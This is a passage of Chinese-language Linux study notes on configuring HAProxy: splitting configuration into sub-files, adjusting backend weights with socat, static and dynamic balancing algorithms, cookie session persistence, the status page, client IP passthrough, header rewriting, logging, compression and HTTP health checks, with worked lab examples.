[11:25:31 root@centos7 ~]# curl 10.0.0.17
this is rs2 10.0.0.28
```

##### 43.2.3.2 子配置文件保存配置

```
#1.概述
当业务众多时，将所有配置都放在一个配置文件中，会造成维护困难。可以考虑按业务分类，将配置信息拆分，放在不同的子配置文件中，从而达到方便维护的目的。




#2.案例

#2.1创建子配置目录
[root@haproxy ~]# mkdir /etc/haproxy/conf.d/


#2.2创建子配置文件test.cfg,必须以cfg为后缀
[root@haproxy ~]# sed -n '37,$p' /etc/haproxy/haproxy.cfg > /etc/haproxy/conf.d/test.cfg


#2.3修改haproxy.cfg文件
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg
global
    maxconn 100000
    chroot /apps/haproxy
    #stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
    stats socket /var/lib/haproxy/haproxy.sock1 mode 600 level admin process 1
    stats socket /var/lib/haproxy/haproxy.sock2 mode 600 level admin process 2
    #uid 99
    #gid 99
    user haproxy
    group haproxy
    daemon
    nbproc 2

    cpu-map 1 0
    cpu-map 2 1
    pidfile /var/lib/haproxy/haproxy.pid
    #log 127.0.0.1 local2 info
    log 10.0.0.18 local6 info

defaults
   option http-keep-alive
   option forwardfor
   maxconn 100000
   mode http
   timeout connect 300000ms
   timeout client 300000ms
   timeout server 300000ms

listen stats
   mode http
   bind 0.0.0.0:9999
   stats enable
   log global
   stats uri    /haproxy-status
   stats auth   haadmin:123456
   
   
   
#2.4添加子配置目录到unit文件中
[root@haproxy ~]# vim /lib/systemd/system/haproxy.service
[Unit]
Description=HAProxy Load Balancer
After=syslog.target network.target

[Service]
ExecStartPre=/usr/sbin/haproxy -f /etc/haproxy/haproxy.cfg -f /etc/haproxy/conf.d/ -c -q
ExecStart=/usr/sbin/haproxy -Ws -f /etc/haproxy/haproxy.cfg -f /etc/haproxy/conf.d/ -p /var/lib/haproxy/haproxy.pid
ExecReload=/bin/kill -USR2 $MAINPID
LimitNOFILE=100000

[Install]
WantedBy=multi-user.target



#2.5启动服务
[root@haproxy ~]# systemctl daemon-reload
[root@haproxy ~]# systemctl restart haproxy
```

### 43.3 HAProxy调度算法

HAProxy通过固定参数 balance 指明对后端服务器的调度算法，该参数可以配置在listen或backend选项中。

HAProxy的调度算法分为静态和动态调度算法，但是有些算法可以根据参数在静态和动态算法中相互转换。

官方文档：http://cbonte.github.io/haproxy-dconv/2.1/configuration.html#4-balance

#### 43.3.1静态算法

**概述：**

```
静态算法：按照事先定义好的规则轮询公平调度，不关心后端服务器的当前负载、连接数和响应速度等，且无法实时修改权重(只能为0和1,不支持其它值)，只能靠重启HAProxy生效。
```

##### 43.3.1.1 socat 工具

```
#1.概述
对服务器动态权重和其它状态可以利用 socat工具进行调整，Socat 是 Linux 下的一个多功能的网络工具，名字来由是Socket CAT，相当于netCAT的增强版.Socat 的主要特点就是在两个数据流之间建立双向通道，且支持众多协议和链接方式。如 IP、TCP、 UDP、IPv6、Socket文件等





#2.案例
[root@centos7 ~]#yum -y install socat
[root@centos7 ~]#echo "help" | socat stdio /var/lib/haproxy/haproxy.sock
[root@centos7 ~]#echo "show info" | socat stdio /var/lib/haproxy/haproxy.sock
[root@centos7 ~]#echo "get weight magedu-test-80/web2" | socat stdio /var/lib/haproxy/haproxy.sock
3 (initial 3) 

#修改weight，注意只针对单进程有效
[root@centos7 ~]#echo "set weight magedu-test-80/web2 2" | socat stdio 
/var/lib/haproxy/haproxy.sock

[root@centos7 ~]#echo "get weight magedu-test-80/web2" | socat stdio 
/var/lib/haproxy/haproxy.sock
2 (initial 3) 

#将后端服务器禁用，注意只针对单进程有效
[root@centos7 ~]#echo "disable server magedu-test-80/web2" | socat stdio 
/var/lib/haproxy/haproxy.sock

#启用后端服务器
[root@centos7 ~]#echo "enable server magedu-test-80/web2" | socat stdio 
/var/lib/haproxy/haproxy.sock

#将后端服务器软下线，即weight设为0
#一般是一个进程对应socket的文件，要所有的socket文件全部设置为0，配置才能生效
[root@centos7 ~]#echo "set weight magedu-test-80/web1 0" | socat stdio 
/var/lib/haproxy/haproxy.sock

#针对haproxy的多进程,将后端服务器禁用/启用
[root@centos7 ~]# echo "disable/enable server magedu-test-80/web2" | socat stdio /var/lib/haproxy/haproxy1.sock
[root@centos7 ~]# echo "disable/enable server magedu-test-80/web2" | socat stdio /var/lib/haproxy/haproxy2.sock

[root@haproxy ~]# for i in {1..2};do echo "set weight magedu-test-80/web$i 10" | 
socat stdio /var/lib/haproxy/haproxy$i.sock;done

#如果静态算法，如:static-rr，可以更改weight为0或1，但不支持动态更改weight为其它值，否则会提示下面信息
[root@centos7 ~]# echo "set weight magedu-test-80/web1 0" | socat stdio 
/var/lib/haproxy/haproxy.sock
[root@centos7 ~]#echo "set weight magedu-test-80/web1 1" | socat stdio 
/var/lib/haproxy/haproxy.sock

[root@centos7 ~]#echo "set weight magedu-test-80/web1 2" | socat stdio 
/var/lib/haproxy/haproxy.sock
Backend is using a static LB algorithm and only accepts weights '0%' and '100%'.
```

##### 43.3.1.2 上线和下线后端服务器脚本

```
#1.设置子配置文件
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
   




#2.设置主配置文件
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg

global
    maxconn 100000
    chroot /apps/haproxy
    #stats socket /var/lib/haproxy/haproxy.sock mode 600 level admin
    stats socket /var/lib/haproxy/haproxy.sock1 mode 600 level admin process 1  #这个开启
    stats socket /var/lib/haproxy/haproxy.sock2 mode 600 level admin process 2  #这个开启
    #uid 99
    #gid 99
    user haproxy
    group haproxy
    daemon
    nbproc 2

    cpu-map 1 0
    cpu-map 2 1
    pidfile /var/lib/haproxy/haproxy.pid
    #log 127.0.0.1 local2 info
    log 10.0.0.18 local6 info

defaults
   option http-keep-alive
   option forwardfor
   maxconn 100000
   mode http
   timeout connect 300000ms
   timeout client 300000ms
   timeout server 300000ms

listen stats
   mode http
   bind 0.0.0.0:9999
   stats enable
   log global
   stats uri    /haproxy-status
   stats auth   haadmin:123456





#3.编写上下线脚本
#!/bin/bash
#
#********************************************************************
#Author:        liusenbiao
#Date:          2022-07-05
#FileName：     haproyx_host_up_down.sh
#Description：   服务器上下线脚本
#********************************************************************
[root@haproxy ~]# vim haproyx_host_up_down.sh
. /etc/init.d/functions
HOSTNAME=liu_webservers1
rpm -q socat || yum -y -q install socat

case $1 in
up)
    for i in {1..2};do
    echo "set weight ${HOSTNAME}/$2 1" | socat stdio /var/lib/haproxy/haproxy.sock$i
    [ $? -eq 0 ] && action "$2 is up"
   done
   ;;
down)
    for i in {1..2};do
    echo "set weight ${HOSTNAME}/$2 0" | socat stdio /var/lib/haproxy/haproxy.sock$i
    [ $? -eq 0 ] && action "$2 is down"
    done
   ;;
*)
   echo "Usage: `basename $0` up|down IP"
   ;;
esac
```

![1657021170759](linux体系.assets/1657021170759.png)

![1657021100478](linux体系.assets/1657021100478.png)

![1657021069835](linux体系.assets/1657021069835.png)

##### 43.3.1.3 static-rr算法

```
#1.概述
static-rr：基于权重的轮询调度，不支持运行时利用socat进行权重的动态调整(只支持0和1,不支持其它值)及后端服务器慢启动，其后端主机数量没有限制，相当于LVS中的 wrr，只能放在listen和backend里面。




#2.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance static-rr   #静态轮询算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
   
[root@haproxy ~]# systemctl restart haproxy
```

##### 43.3.1.4 first算法

```
#1.概述
first：根据服务器在列表中的位置，自上而下进行调度，简而言之，就是一个服务器实在撑不住了，才往下面的服务器上调度





#2.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance first   #first算法
   server 10.0.0.18 10.0.0.18:80 check maxconn 10  #到了10个以后就会分配到下一个服务器上
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
   
[root@haproxy ~]# systemctl restart haproxy
```

#### 43.3.2 动态算法

动态算法：基于后端服务器状态进行调度适当调整，优先调度至当前负载较低的服务器，且权重可以在haproxy运行时动态调整无需重启。

##### 43.3.2.1 roundrobin算法

```
#1.概述
roundrobin：基于权重的轮询动态调度算法，支持权重的运行时调整，不同于lvs中的rr轮训模式，HAProxy中的roundrobin支持慢启动(新加的服务器会逐渐增加转发数)，其每个后端backend中最多支持4095个real server，支持对real server权重动态调整，roundrobin为默认调度算法,此算法使用广泛。




#2.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance roundrobin #roundrobin算法
   server 10.0.0.18 10.0.0.18:80 check maxconn 10
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
   
[root@haproxy ~]# echo "set weight liu_webservers1/10.0.0.18 10" | socat stdio 
/var/lib/haproxy/haproxy.sock
[root@haproxy ~]# echo "get weight iu_webservers1/10.0.0.18 10" | socat stdio /var/lib/haproxy/haproxy.sock 
10 (initial 1)
[root@haproxy ~]# systemctl reload haproxy
```

##### 43.3.2.2 leastconn算法

```
#1.概述
leastconn加权的最少连接的动态，支持权重的运行时调整和慢启动，即:根据当前连接最少的后端服务器而非权重进行优先调度(新客户端连接)，比较适合长连接的场景使用，比如：MySQL等场景。




#2.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance leastconn  #leastconn算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
   
[root@haproxy ~]# echo "set weight liu_webservers1/10.0.0.18 10" | socat stdio 
/var/lib/haproxy/haproxy.sock
[root@haproxy ~]# echo "get weight iu_webservers1/10.0.0.18 10" | socat stdio /var/lib/haproxy/haproxy.sock 
10 (initial 1)
[root@haproxy ~]# systemctl restart haproxy
```

##### 43.3.2.3 random算法

```
#1.概述
在1.9版本开始增加 random的负载平衡算法，其基于随机数作为一致性hash的key，随机负载平衡对于大型服务器场或经常添加或删除服务器非常有用，支持weight的动态调整，weight较大的主机有更大概率获取新请求




#2.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance random   #random算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
   
[root@haproxy ~]# echo "set weight liu_webservers1/10.0.0.18 10" | socat stdio 
/var/lib/haproxy/haproxy.sock
[root@haproxy ~]# echo "get weight iu_webservers1/10.0.0.18 10" | socat stdio /var/lib/haproxy/haproxy.sock 
10 (initial 1)
[root@haproxy ~]# systemctl restart haproxy
```

#### 43.3.3 动静结合算法

此算法即可作为静态算法，又可以通过选项成为动态算法

##### 43.3.3.1 source算法

```
#1.概述
源地址hash，基于用户源地址hash并将请求转发到后端服务器，后续同一个源地址请求将被转发至同一个后端web服务器。此方式当后端服务器数据量发生变化时，会导致很多用户的请求转发至新的后端服务器，默认为静态方式，但是可以通过hash-type支持的选项更改。

这个算法一般是在不插入Cookie的TCP模式下使用，也可给拒绝会话cookie的客户提供最好的会话粘性，适用于session会话保持但不支持cookie和缓存的场景
源地址有两种转发客户端请求到后端服务器的服务器选取计算方式，分别是取模法和一致性hash。

#1.1map-base 取模法
map-based：取模法，对source地址进行hash计算，再基于服务器总权重的取模，最终结果决定将此请求转发至对应的后端服务器。此方法是静态的，即不支持在线调整权重，不支持慢启动，可实现对后端服务器均衡调度。缺点是当服务器的总权重发生变化时，即有服务器上线或下线，都会因总权重发生变化而导致调度结果整体改变，hash-type 指定的默认值为此算法.





#2.案例：
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance source  #hash算法
   hash-type map-based |consistent 静|动算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
[root@haproxy ~]# systemctl reload haproxy
```

##### 43.3.3.2 uri算法

```
#1.概述
基于对用户请求的URI的左半部分或整个uri做hash，再将hash结果对总权重进行取模后，根据最终结果将请求转发到后端指定服务器，适用于后端是缓存服务器场景，默认是静态算法，也可以通过hash-type指定map-basedconsistent，来定义使用取模法还是一致性hash。(uri固定了，调度也就定了),通常应用于缓存。

注意：此算法基于应用层，所以只支持 mode http ，不支持 mode tcp。





#2.案例：
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   #balance url_param userid   #url/?key=value 如果访问curl 10.0.0.100/test.html?userid=value
   balance uri  #uri算法
   hash-type consistent 动态算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
[root@haproxy ~]# systemctl reload haproxy
```

##### 43.3.3.3 hdr算法

```
#1.概述
针对用户每个http头部(header)请求中的指定信息做hash，此处由name指定的http首部将会被取出并做hash计算，然后由服务器总权重取模以后派发至某挑出的服务器，如果无有效值，则会使用默认的轮询调度。(根据浏览器的版本，调度到不同的服务器上，向用户展示不同的数据)






#2.案例：
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance hdr(User-Agent)  #hdr算法
   hash-type consistent 动态算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
[root@haproxy ~]# systemctl reload haproxy
```

##### 43.3.3.4 rdp-cookie算法

```
#1.概述
rdp-cookie对远windows远程桌面的负载，使用cookie保持会话，默认是静态，也可以通过hash-type指定map-based和consistent，来定义使用取模法还是一致性hash。





#2.案例：

#2.1基于rdp-cookie
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
listen liu_rdp_3389
   bind 10.0.0.17:3389  #本机机器
   mode tcp
   balance rdp-cookie
   server rdp1 10.0.0.200:3389 #调度到的远程机器
   
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   balance hdr(User-Agent)  #hdr算法
   hash-type consistent 动态算法
   server 10.0.0.18 10.0.0.18:80 check
   server 10.0.0.28 10.0.0.28:80 check
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
[root@haproxy ~]# systemctl reload haproxy



#2.2基于iptables
必须开启ip转发功能： net.ipv4.ip_forward = 1
[root@centos8 ~]#sysctl -w net.ipv4.ip_forward=1

#客户端和Windows在不同网段需要下面命令,注意后端服务器需要将iptables主机配置为网关
[root@centos8 ~]#iptables -t nat -A PREROUTING -d 172.16.0.100 -p tcp --dport 
3389 -j DNAT --to-destination 10.0.0.200:3389

#客户端和Windows在同一网段需要再执行下面命令
[root@centos8 ~]#iptables -t nat -A PREROUTING -d 10.0.0.17 -p tcp --dport 3389 -j DNAT --to-destination 10.0.0.200:3389
[root@centos8 ~]#iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -j SNAT --to-source 10.0.0.17
```
##### 43.3.3.4 算法总结

```
#1.各类算法
#静态
static-rr--------->tcp/http  
first------------->tcp/http  
#动态
roundrobin-------->tcp/http 
leastconn--------->tcp/http 
random------------>tcp/http
#以下静态和动态取决于hash_type是否consistent
source------------>tcp/http
Uri--------------->http
url_param--------->http     
hdr--------------->http
rdp-cookie-------->tcp





#2.使用场景
first #使用较少
static-rr #做了session共享的web集群
roundrobin
random
leastconn #数据库
source #基于客户端公网IP的会话保持
Uri--------------->http  #缓存服务器，CDN服务商，蓝汛、百度、阿里云、腾讯
url_param--------->http  #可以实现session保持
hdr #基于客户端请求报文头部做下一步处理
rdp-cookie #基于Windows主机,很少使用
```

### 43.4 高级功能及配置

#### 43.4.1 基于cookie的会话保持

```
#1.概述
cookie value：为当前server指定cookie值，实现基于cookie的会话黏性，相对于基于 source 地址hash 调度算法对客户端的粒度精准，但同时也加大了haproxy负载，目前此模式使用较少， 已经被session共享服务器代替。
注意：不支持 tcp mode，使用 http mode




#2.配置选项
cookie name [ rewrite | insert | prefix ][ indirect ] [ nocache ][ postonly ] [ preserve ][ httponly ] [ secure ][ domain ]* [ maxidle <idle> ][ maxlife ]

name： #cookie 的 key名称，用于实现持久连接
insert： #插入新的cookie,默认不插入cookie
indirect： #如果客户端已经有cookie,则不会再发送cookie信息
nocache： #当client和hapoxy之间有缓存服务器（如：CDN）时，不允许中间缓存器缓存cookie，因为这会导致很多经过同一个CDN的请求都发送到同一台后端服务器




#3.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1

backend liu_webservers1
   cookie WEBSRV insert nocache indirect  #建议加上
   server 10.0.0.18 10.0.0.18:80 check cookie web1
   server 10.0.0.28 10.0.0.28:80 check cookie web2
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
[root@haproxy ~]# systemctl reload haproxy



#实现cookie调度
root@rs1:~# curl -b 'WEBSRV=web1' http://10.0.0.17
this is rs1 10.0.0.18
root@rs1:~# curl -b 'WEBSRV=web1' http://10.0.0.17
this is rs1 10.0.0.18
root@rs1:~# curl -b 'WEBSRV=web2' http://10.0.0.17
this is rs2 10.0.0.28
root@rs1:~# curl -b 'WEBSRV=web2' http://10.0.0.17
this is rs2 10.0.0.28
```

![1657104159279](linux体系.assets/1657104159279.png)

#### 43.4.2 HAProxy状态页

```
#1.概述
通过web界面，显示当前HAProxy的运行状态
官方帮助：
http://cbonte.github.io/haproxy-dconv/2.1/configuration.html#4-stats%20admin
http://cbonte.github.io/haproxy-dconv/2.0/configuration.html#4-stats%20admin




#2.状态页配置项
stats enable   #基于默认的参数启用stats page
stats hide-version   #将状态页中haproxy版本隐藏
stats refresh <delay> #设定自动刷新时间间隔，默认不自动刷新
stats uri <prefix> #自定义stats page uri，默认值：/haproxy?stats 
stats realm <realm> #账户认证时的提示信息，示例：stats realm   HAProxy\ 
Statistics
stats auth <user>:<passwd> #认证时的账号和密码，可定义多个用户,每行指定一个用户.默认：no authentication
stats admin { if | unless } <cond> #启用stats page中的管理功能





#3.案例
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg
listen stats
   mode http
   bind 0.0.0.0:9999
   stats refresh 3s
   stats enable
   log global
   stats uri    /haproxy-status
   stats auth   haadmin:123456
   
   
  
 

#3.2利用状态页实现haproxy服务器的健康性检查
[root@centos8 ~]# curl -I http://haadmin:123456@10.0.0.7:9999/haproxy-status
HTTP/1.1 200 OK
cache-control: no-cache
content-type: text/html
[root@centos8 ~]# curl -I -u haadmin:123456 http://10.0.0.7:9999/haproxy-status
HTTP/1.1 200 OK
cache-control: no-cache
content-type: text/html
[root@centos8 ~]# echo $?
0
[root@haproxy ~]# systemctl stop haproxy
[root@centos8 ~]# curl -I
http://haadmin:123456@10.0.0.7:9999/haproxy-status
curl: (7) Failed to connect to 10.0.0.7 port 9999: Connection refused
[root@centos8 ~]# echo $?
7
```

#### 43.4.3 IP透传

**四层：IP+PORT转发**

**七层：协议+内容交换**

![1657111224703](linux体系.assets/1657111224703.png)

```
#1.四层负载
在四层负载设备中，把client发送的报文目标地址(原来是负载均衡设备的IP地址)，根据均衡设备设置的选择web服务器的规则选择对应的web服务器IP地址，这样client就可以直接跟此服务器建立TCP连接并发送数据，而四层负载自身不参与建立连接，而和LVS不同，haproxy是伪四层负载均衡，因为haproxy需要分别和前端客户端及后端服务器建立连接


#2.七层代理
七层负载均衡服务器起了一个反向代理服务器的作用，服务器建立一次TCP连接要三次握手，而client要访问Web Server要先与七层负载设备进行三次握手后建立TCP连接，把要访问的报文信息发送给七层负载均衡；然后七层负载均衡再根据设置的均衡规则选择特定的 Web Server，然后通过三次握手与此台Web Server建立TCP连接，然后Web Server把需要的数据发送给七层负载均衡设备，负载均衡设备再把数据发送给client；所以，七层负载均衡设备起到了代理服务器的作用，七层代理需要和Client和后端服务器分别建立连接
```

##### 43.4.3.1 四层IP透传

```
#四层IP透传实现后只能通过代理访问，不能直接访问www.liusenbiao.com

#1.haproxy 配置：
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg
listen web_http_nodes
   bind  10.0.0.100:8080
   mode tcp            #不支持http协议
   balance roundrobin
   server web1 www.liusenbiao.com:80 send-proxy check inter 3000 fall 3
rise 5 #添加send-proxy


#2.nginx 配置：
在访问日志中通过变量$proxy_protocol_addr 记录透传过来的客户端IP
http {
 log_format main  '$remote_addr - $remote_user [$time_local] "$request" 
"$proxy_protocol_addr"'
   server {
       listen       80 proxy_protocol; #启用此项，将无法直接访问此网站，只能通过四层代理
   
   

#3.访问10.0.0.100:8080会通过代理服务器转发到 www.liusenbiao.com主页上
```

![1657112647007](linux体系.assets/1657112647007.png)

##### 43.4.3.2 七层IP透传

```
#1.概述
当haproxy工作在七层的时候，也可以透传客户端真实IP至后端服务器



#2.HAProxy配置
在由haproxy发往后端主机的请求报文中添加“X-Forwarded-For"首部，其值为前端客户端的地址；用于向后端主发送真实的客户端IP
option forwardfor [ except <network> ] [ header <name> ] [ if-none ]
[ except <network> ]：请求报请来自此处指定的网络时不予添加此首部，如haproxy自身所在网络
[ header <name> ]：使用自定义的首部名称，而非“X-Forwarded-For"，示例：X-client
[ if-none ] 如果没有首部才添加首部，如果有使用默认值




#3.案例

#3.1主配置文件中开启forwardfor
#10.0.0.17上
[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg
defaults
   option http-keep-alive
   option forwardfor    #开启这个
   maxconn 100000
   mode http
   timeout connect 300000ms
   timeout client 300000ms
   timeout server 300000ms
   
   
#3.2 web服务器日志格式配置
#10.0.0.18上
root@rs1:~# vim /etc/httpd/conf/httpd.conf
<IfModule log_config_module>
    #
    # The following directives define some format nicknames for use with
    # a CustomLog directive (see below).
    #
    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" \"%{X-Forwarded-For}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %b" common


#3.3 查看日志
root@rs1:~# tail /var/log/httpd/access_log -f
10.0.0.17 - - [07/Jul/2022:09:58:49 +0800] "GET / HTTP/1.1" 200 22 "-" "curl/7.29.0" "10.0.0.7"
```

#### 43.4.4 报文修改

```
#1.概述
在http模式下，基于实际需求修改客户端的请求报文与响应报文，通过reqadd和reqdel在请求报文添加删除字段，通过rspadd与rspidel在响应报文中添加与删除字段。
注意：此功能的以下相关指令在2.1版本中已经取消


#2.配置说明
#在向后端服务器转发的请求报文尾部添加指定首部
 reqadd <string> [{if | unless} <cond>]
 示例：reqadd X-Via:\ HAproxy   #注意只能有一个空格，并需要转义
  
#在向后端服务器转发的请求报文中删除匹配正则表达式的首部
 reqdel <search> [{if | unless} <cond>]
 reqidel <search> [{if | unless} <cond>]   #忽略大小写
 示例：
 reqidel user-agent
 reqidel X-Forwarded-For #无法删除
  
#在向前端客户端转发的响应报文尾部添加指定首部
 rspadd <string> [{if | unless} <cond>] 
 示例：
 rspadd X-Via:\ HAproxy 
 rspadd Server:\ liuginx
 
#从向前端客户端转发的响应报文中删除匹配正则表达式的首部
 rspdel <search> [{if | unless} <cond>]
 rspidel <search> [{if | unless} <cond>]   #忽略大小写
  rspidel ^server:.* #从响应报文删除server信息
 rspidel X-Powered-By:.* #从响应报文删除X-Powered-By信息,一般此首部字段保存php版本信息 #
 
 
 
 
 
 
 #3.案例
 [root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg

frontend liu_web_80
   bind 10.0.0.17:80
   use_backend liu_webservers1
   http-request add-header X-Haproxy-Current-Date %T
   http-response add-header liuServer
   http-response del-header server
   http-response add-header X-via haproxy-liu

backend liu_webservers1
   #cookie WEBSRV insert nocache indirect
   server 10.0.0.18 10.0.0.18:80 check cookie web1
   server 10.0.0.28 10.0.0.28:80 check cookie web2
   server local 127.0.0.1:80 backup

backend liu_webservers2
   server 10.0.0.28 10.0.0.28:80 check
[root@haproxy ~]# systemctl restart haproxy
```

#### 43.4.5 自定义日志格式

```
#1.概述
log global 开启日志功能，默认只会在记录下面格式的日志
[root@haproxy ~]#tail /var/log/haproxy.log
Apr 9 19:38:46 localhost haproxy[60049]: Connect from 172.16.0.200:54628 to 172.16.0.100:80 (web_prot_http_nodes/HTTP)

option httplog 可以用 http 格式记录下来，并且可以使用相关指令将特定信息记录在haproxy的日志中，但一般不建议开启，这会加重 HAProxy负载





#2.配置选项
log global     #开启记录日志,默认不开启
option httplog                              #开启记录httplog日志格式选项
capture cookie <name> len <length>          #捕获请求和响应报文中的 cookie及值的长度,将之记录到日志 
capture request header <name> len <length>  #捕获请求报文中指定的首部内容和长度并记录日志
capture response header <name> len <length>  #捕获响应报文中指定的内容和长度首部并记录日志





#3.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
listen liu
     log global
     option httplog
     bind 10.0.0.17:80
     server 10.0.0.18 10.0.0.18:80 check
     server 10.0.0.28 10.0.0.28:80 check
     capture request header Host len  256
     capture request header User-Agent len 512 
     capture request header Referer len 15
     capture request header X-Forwarded-For len 15
     
[root@haproxy ~]# systemctl restart haproxy
```

#### 43.4.6 压缩功能

```
#1.概述
对响应给客户端的报文进行压缩，以节省网络带宽，但是会占用部分CPU性能
建议在后端服务器开启压缩功能，而非在HAProxy上开启压缩



#2.配置选项
compression algo <algorithm> ... #启用http协议中的压缩机制，常用算法有
gzip，deflate
#压缩算法<algorithm>支持下面类型：
 identity #debug调试使用的压缩方式
 gzip #常用的压缩方式，与各浏览器兼容较好
 deflate #有些浏览器不支持
 raw-deflate #新式的压缩方式
  
compression type <mime type> ... #要压缩的文件类型



#3.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
listen liu
     log global
     option httplog
     bind 10.0.0.17:80
     compression algo gzip deflate  #开启压缩
     compression type text/html text/css text/plain   #开启压缩
     server 10.0.0.18 10.0.0.18:80 check
     server 10.0.0.28 10.0.0.28:80 check
     capture request header Host len  256
     capture request header User-Agent len 512 
     capture request header Referer len 15
     capture request header X-Forwarded-For len 15
     
[root@haproxy ~]# systemctl restart haproxy
```

#### 43.4.7 web服务器状态监测

##### 43.4.7.1三种状态监测方式

```
基于四层的传输端口做状态监测，此为默认方式
基于指定 URI 做状态监测,需要访问整个页面资源,占用更多带宽
基于指定 URI 的request请求头部内容做状态监测，占用较少带宽,建议使用此方式
```

##### 43.4.7.2 基于应用层http协议进行健康性检测

```
#1.概述
基于应用层http协议，采有不同的监测方式，对后端real server进行状态监测
注意: 此方式会导致在后端服务器生成很多的HAProxy发起的访问日志


option httpchk   #启用七层健康性检测，对tcp 和 http 模式都支持，默认为：OPTIONS 
/ HTTP/1.0
option httpchk <uri>
option httpchk <method> <uri>
option httpchk <method> <uri> <version>

#期望以上检查得到的响应码
http-check expect [!] <match> <pattern>
#示例：
http-check expect status 200
http-check expect ! rstatus ^5 #支持正则表达式




#2.案例
[root@haproxy ~]# vim /etc/haproxy/conf.d/test.cfg
listen web_host
   bind 10.0.0.7:80
   mode http
   balance roundrobin
  #option httpchk GET /monitor/check.html #默认HTTP/1.0
  #option httpchk GET /monitor/check.html HTTP/1.0
  #option httpchk GET /monitor/check.html HTTP/1.1 #注意：HTTP/1.1强制要求必须有Host字段
  option httpchk HEAD /monitor/check.html HTTP/1.1\r\nHost:\ 10.0.0.7 #使用HEAD减少网络流量
 cookie SERVER-COOKIE insert indirect nocache
 server web1 10.0.0.17:80 cookie web1 check inter 3000 fall 3 rise 5
 server web2 10.0.0.27:80 cookie web2 check inter 3000 fall 3 rise 5
[root@haproxy ~]# systemctl restart haproxy


#在所有后端服务建立检测页面
[root@backend ~]#mkdir /var/www/html/monitor/
[root@backend ~]#echo monitor > /var/www/html/monitor/check.html
#关闭一台Backend服务器
[root@backend1 ~]#systemctl stop httpd
```

![1657189247944](linux体系.assets/1657189247944.png)

```
#后端服务器查看访问日志
[root@backend ~]#tail /var/log/httpd/access_log
10.0.0.7 - - [02/Apr/2020:14:25:22 +0800] "HEAD /monitor/check.html HTTP/1.1"
200 - "-" "-"
10.0.0.7 - - [02/Apr/2020:14:25:25 +0800] "HEAD /monitor/check.html HTTP/1.1"
200 - "-" "-"
10.0.0.7 - - [02/Apr/2020:14:25:28 +0800] "HEAD /monitor/check.html HTTP/1.1"
200 - "-" "-"
```

#### 43.4.8 ACL访问控制列表

